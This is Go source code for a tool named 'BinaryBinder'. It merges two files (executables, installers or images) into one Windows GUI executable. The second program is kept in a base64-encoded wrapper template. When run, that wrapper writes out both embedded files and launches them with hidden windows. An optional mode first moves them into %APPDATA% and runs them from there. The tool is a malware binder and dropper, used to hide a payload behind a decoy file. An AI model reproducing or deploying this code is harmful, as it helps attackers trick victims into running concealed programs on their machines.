package main

import "os"
import "io/ioutil"
import "strings"
import "os/exec"
import "encoding/base64"
import "path/filepath"
import "runtime"
import "color"


var Hide = false
var FullArgs string
var OutputFile []string

func main(){
	CheckGolang()
	Dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));

  ARGS := os.Args[1:]

	if len(ARGS) == 0 {
    color.Blue(HELP)
    os.Exit(1)
  }


  if (!(strings.HasSuffix(string(ARGS[0]), ".exe"))) && (!(strings.HasSuffix(string(ARGS[0]), ".jpg"))) && (!(strings.HasSuffix(string(ARGS[0]), ".jpeg"))) && (!(strings.HasSuffix(string(ARGS[0]), ".png"))) && (!(strings.HasSuffix(string(ARGS[0]), ".msi"))) {
    color.Red("\n[!] ERROR : Invalid file type !")
    os.Exit(1)
  }

  if (!(strings.HasSuffix(string(ARGS[1]), ".exe"))) && (!(strings.HasSuffix(string(ARGS[1]), ".jpg"))) && (!(strings.HasSuffix(string(ARGS[1]), ".jpeg"))) && (!(strings.HasSuffix(string(ARGS[1]), ".png"))) && (!(strings.HasSuffix(string(ARGS[1]), ".msi"))) {
    color.Red("\n[!] ERROR : Invalid file type !")
    os.Exit(1)
  }

  if len(ARGS) > 2 {
    for i := 0; i < len(ARGS); i++ {
      FullArgs += ARGS[i]
    }

    if strings.Contains(FullArgs, "--hide") || strings.Contains(FullArgs, "--HIDE") {
      Hide = true
    }

    if strings.Contains(FullArgs, "-o") || strings.Contains(FullArgs, "-O") {
      if strings.Contains(FullArgs, "-o") {
        OutputFile = strings.Split(FullArgs, "-o")
      }else if strings.Contains(FullArgs, "-O") {
        OutputFile = strings.Split(FullArgs, "-O")
      }
    }else{
      OutputFile[1] = "Binary.exe"
    }


    if (!strings.Contains(FullArgs, "-o")) && (!strings.Contains(FullArgs, "-O")) && (!strings.Contains(FullArgs, "--hide")) && (!strings.Contains(FullArgs, "--HIDE")) {
      color.Red("\n[!] ERROR : Invalid option !")
      os.Exit(1)      
    }
  }



  Binary_1, err1 := ioutil.ReadFile(string(ARGS[0]))
  if err1 != nil {
    Error1 := string("[!] ERROR : Unable to open "+string(ARGS[0]))
    color.Red(Error1)
  } 
  Binary_2, err2 := ioutil.ReadFile(string(ARGS[1]))
  if err2 != nil {
    Error2 := string("[!] ERROR : Unable to open "+string(ARGS[1]))
    color.Red(Error2)
  } 
  EncodedBinary_1 := base64.StdEncoding.EncodeToString(Binary_1)
  EncodedBinary_1 = string(`"`+EncodedBinary_1+`"`)
  EncodedBinary_2 := base64.StdEncoding.EncodeToString(Binary_2)
  EncodedBinary_2 = string(`"`+EncodedBinary_2+`"`)

  WrapperTemplate,_ := base64.StdEncoding.DecodeString(WrapperTemplate)
  WrapperIndex := strings.Replace(string(WrapperTemplate), "//BINARY-1//", string(EncodedBinary_1), -1)
  WrapperIndex = strings.Replace(string(WrapperIndex), "//BINARY-2//", string(EncodedBinary_2), -1)
  WrapperIndex = strings.Replace(string(WrapperIndex), "//BINARY-1-NAME//", string(`"`+ARGS[0]+`"`), -1)
  WrapperIndex = strings.Replace(string(WrapperIndex), "//BINARY-2-NAME//", string(`"`+ARGS[1]+`"`), -1)

  if Hide == true {
    WrapperIndex = strings.Replace(string(WrapperIndex), "Hide bool = false", "Hide bool = true", -1)
  }

  Wrapper,_ := os.Create("Wrapper.go")
  Wrapper.WriteString(string(WrapperIndex))
  Wrapper.Close()

  Info := string("[*] "+ARGS[0]+" and "+ARGS[1]+" binding together as " + OutputFile[1])
  color.Green(Info)

  if runtime.GOOS == "windows" {
    exec.Command("cmd", "/C", string("export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" -o " + OutputFile[1] + " Wrapper.go ")).Run()
    exec.Command("cmd", "/C", "del Wrapper.go").Run()  
  }else if runtime.GOOS == "linux" {
    Build := string("export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" -o " + OutputFile[1] + " Wrapper.go ")
    exec.Command("sh", "-c", Build).Run()
    exec.Command("sh", "-c", "rm Wrapper.go").Run()
  }


  for i := 0; i < 2; i++ {
    color.Green("|")
  }
  if runtime.GOOS == "windows" {
    Size, _ := exec.Command("cmd", "/C", string("for %I in (" + OutputFile[1] + ") do @echo %~zI")).Output()
    Info = string("[*] File Size : " + string(Size))
    color.Green(Info)  
  }else if runtime.GOOS == "linux" {
    Size, _ := exec.Command("sh", "-c", string("ls -s " + OutputFile[1])).Output()
    Info = string("[*] File Size : " + string(Size))
    color.Green(Info)
  }
  
  for i := 0; i < 2; i++ {
    color.Green("|")
  }
  Info = string("[*] File Path : " + string(Dir))
  color.Green(Info)
}


var WrapperTemplate string = `cGFja2FnZSBtYWluCgppbXBvcnQgIm9zIgppbXBvcnQgIm9zL2V4ZWMiCmltcG9ydCAiZW5jb2RpbmcvYmFzZTY0IgppbXBvcnQgInN5c2NhbGwiCgoKCgoKdmFyIEJpbmFyeV8xX05hbWUgc3RyaW5nID0gLy9CSU5BUlktMS1OQU1FLy8KdmFyIEJpbmFyeV8yX05hbWUgc3RyaW5nID0gLy9CSU5BUlktMi1OQU1FLy8KCnZhciBCaW5hcnlfMSBzdHJpbmcgPSAvL0JJTkFSWS0xLy8KdmFyIEJpbmFyeV8yIHN0cmluZyA9IC8vQklOQVJZLTIvLwoKdmFyIEhpZGUgYm9vbCA9IGZhbHNlCgpmdW5jIG1haW4oKSB7CglCaW5hcnkxLCBfIDo9IG9zLkNyZWF0ZShCaW5hcnlfMV9OYW1lKQoJRGVjb2RlZEJpbmFyeTEsXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKEJpbmFyeV8xKQoJQmluYXJ5MS5Xcml0ZVN0cmluZyhzdHJpbmcoRGVjb2RlZEJpbmFyeTEpKQoJQmluYXJ5MS5DbG9zZSgpCgoKCUJpbmFyeTIsIF8gOj0gb3MuQ3JlYXRlKEJpbmFyeV8yX05hbWUpCglEZWNvZGVkQmluYXJ5MixfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoQmluYXJ5XzIpCglCaW5hcnkyLldyaXRlU3RyaW5nKHN0cmluZyhEZWNvZGVkQmluYXJ5MikpCglCaW5hcnkyLkNsb3NlKCkKCgoJaWYgSGlkZSA9PSB0cnVlIHsKCQlNb3ZlQ29tbWFuZDEgOj0gc3RyaW5nKCJtb3ZlICIrQmluYXJ5XzFfTmFtZSsiICVBUFBEQVRBJSIpCgkJRXhlY3V0ZUNvbW1hbmQxIDo9IHN0cmluZygiJUFQUERBVEElXFwiK0JpbmFyeV8xX05hbWUpCiAgICAJTW92ZTEgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBNb3ZlQ29tbWFuZDEpOwogICAgCU1vdmUxLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICAJTW92ZTEuU3RhcnQoKQogICAgCUV4ZWN1dGUxIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgRXhlY3V0ZUNvbW1hbmQxKTsKICAgIAlFeGVjdXRlMS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgCUV4ZWN1dGUxLlN0YXJ0KCkJCS8vIm1vdmUgIitCaW5hcnlfMl9OYW1lKyIgJUFQUERBVEElIgoKCgkJTW92ZUNvbW1hbmQyIDo9IHN0cmluZygibW92ZSAiK0JpbmFyeV8yX05hbWUrIiAlQVBQREFUQSUiKQoJCUV4ZWN1dGVDb21tYW5kMiA6PSBzdHJpbmcoIiVBUFBEQVRBJVxcIitCaW5hcnlfMl9OYW1lKQogICAgCU1vdmUyIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgTW92ZUNvbW1hbmQyKTsKICAgIAlNb3ZlMi5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgCU1vdmUyLlN0YXJ0KCkKICAgIAlFeGVjdXRlMiA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIEV4ZWN1dGVDb21tYW5kMik7CiAgICAJRXhlY3V0ZTIuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIAlFeGVjdXRlMi5TdGFydCgpCgoJfWVsc2V7CgkgICAgRXhlY3V0ZTEgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBCaW5hcnlfMV9OYW1lKTsKICAgIAlFeGVjdXRlMS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgCUV4ZWN1dGUxLlN0YXJ0KCkKICAgIAlFeGVjdXRlMiA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIEJpbmFyeV8yX05hbWUpOwogICAgCUV4ZWN1dGUyLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICAJRXhlY3V0ZTIuU3RhcnQoKQoJfQoKCn0=`


var HELP string = `
__________.__                            __________.__            .___            
\______   \__| ____ _____ _______ ___.__.\______   \__| ____    __| _/___________ 
 |    |  _/  |/    \\__  \\_  __ <   |  | |    |  _/  |/    \  / __ |/ __ \_  __ \
 |    |   \  |   |  \/ __ \|  | \/\___  | |    |   \  |   |  \/ /_/ \  ___/|  | \/
 |______  /__|___|  (____  /__|   / ____| |______  /__|___|  /\____ |\___  >__|   
        \/        \/     \/       \/             \/        \/      \/    \/       

USAGE : ./BinaryBinder (Binary_1.exe) (Binary_2.exe) (options)

OPTIONS : 

-o          Specify output file name

--hide			Hide the binarys after dispatch
	

`



func CheckGolang() {
  if runtime.GOOS == "linux" {
    Result,_ := exec.Command("sh", "-c", "go version").Output()

    if !(strings.Contains(string(Result), "version")){
      
      exec.Command("sh", "-c", `zenity --info --text="Golang is not installed !" --title="Warning !"`).Run()
      go exec.Command("sh", "-c", `zenity --info --text="Installing golang...!" --title="Setup"`).Run()
      exec.Command("sh", "-c", `apt-get install golang`).Run()
    }

  }else if runtime.GOOS == "windows"{
    Result,_ := exec.Command("cmd", "/C", "go version").Output()

    if !(strings.Contains(string(Result), "version")){
      exec.Command("cmd", "/C", `msg * Please install golang first !`).Run()
      os.Exit(1)
    }
  }
}
